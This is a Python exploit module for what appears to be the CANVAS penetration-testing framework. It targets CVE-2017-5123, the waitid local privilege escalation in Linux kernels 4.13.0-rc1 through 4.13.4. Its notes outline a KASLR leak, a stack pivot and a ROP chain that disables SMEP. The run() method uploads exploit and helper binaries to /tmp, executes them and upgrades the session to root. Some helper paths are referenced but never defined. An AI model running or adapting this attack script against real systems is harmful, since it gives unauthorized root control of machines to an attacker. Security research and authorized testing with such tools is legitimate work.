#! /usr/bin/env python

# system imports
import sys
import os
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

# GUI info
NAME                            = "Waitid linux local privilege escalation"
DESCRIPTION                     = "Waitid local privilege escalation for linux kernels 4.13.0-rc1 through 4.13.4"
DOCUMENTATION                   = {}
DOCUMENTATION["DATE PUBLIC"]    = "2017-10-12"
DOCUMENTATION["REFERENCES"]     = "https://salls.github.io/Linux-Kernel-CVE-2017-5123/"
DOCUMENTATION["CVE NAME"]       = "CVE-2017-5123"
DOCUMENTATION["CVE URL"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5123"
DOCUMENTATION['CVSS']           = 7.8
DOCUMENTATION["REPEATABILITY"]  = "Infinite"
DOCUMENTATION["NOTES"]          = """Limited kernel write due to a lack of ok_access check on exit.c, kernels from 4.13.0-rc1 through 4.13.4.
The exploit works by abusing a leak given by CVE-2017-14954, which leaks kernel function pointers and address of the kernel stack.
The primitive writes a structure in which only a few bytes are controlled, we use it to overwrite part of the stack, which is then popped onto r10, which is later used to write into rsp before returning.
By exploiting this, it is possible to pivot the stack onto userland, ROP to disable SMEP and then execute userland code, which escalates to root.
Finally, the original stack is restored and the userland code jumps back to the original return address, continuing execution.

This exploits bypasses KASLR and SMEP but since ROP is done by pivoting the stack on userland, it doesn't bypass SMAP.
KPTI is not a concern, since the kernels are not new enough to have this implemented.
"""
VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Linux", "x64"]]
PROPERTY['KERNELVER']           = ["4.13.2-041302-generic",
                                   "4.13.0-041300rc1-generic",
                                   "4.13.0-041300rc6-generic",
                                   "4.13.0-041300rc7-generic",
                                   "4.13.3-041303-generic",
                                   "4.13.0-041300rc2-generic",
                                   "4.13.0-041300rc3-generic",
                                   "4.13.4-041304-generic",
                                   "4.13.0-041300rc4-generic",
                                   "4.13.1-041301-generic"]


class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_64      = os.path.join(self.local_res, 'x64')
        self.local_32      = os.path.join(self.local_res, 'x86')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node

            if self.node.shell is None:
                logging.error("Node has no shell server available")
                logging.error("Bailing")
                continue

            if not self.is_linux_node():
                continue
            if self.is_32bit_node():
                logging.error("32 bit is not supported right now")
                logging.error("Bailing")
                continue

            if self.compromised(self.remote_helper, 0):
                logging.info('Already compromised')
                logging.info('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                logging.info('Done')

                self.init_mosdef_upgrade()
                self.cleanup()
                continue

            self.log_info('Uploading helper and exploit')
            if self.is_32bit_node():
                if self.nodeUpload(self.local_32, self.remote_exp) == False:
                    continue
                if self.nodeUpload(self.local_helper_32, self.remote_helper) == False:
                    continue
            else:
                if self.nodeUpload(self.local_64, self.remote_exp) == False:
                    continue
                if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                    continue

            logging.info('Executing exploit')
            self.fork_and_exec(self.remote_exp)
            logging.info('Waiting...')

            # wait 40 secs for the exploit to complete
            wait_secs = 5
            if self.compromised(self.remote_helper, wait_secs):
                logging.info('Compromised!')
                logging.info('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.cleanup()
                logging.info('Done')

                self.init_mosdef_upgrade()
                self.cleanup()
                return 1
            else:
                logging.error('Looks like we failed, try again!')
                self.cleanup()
                return 0

        return 0

if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (NAME, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

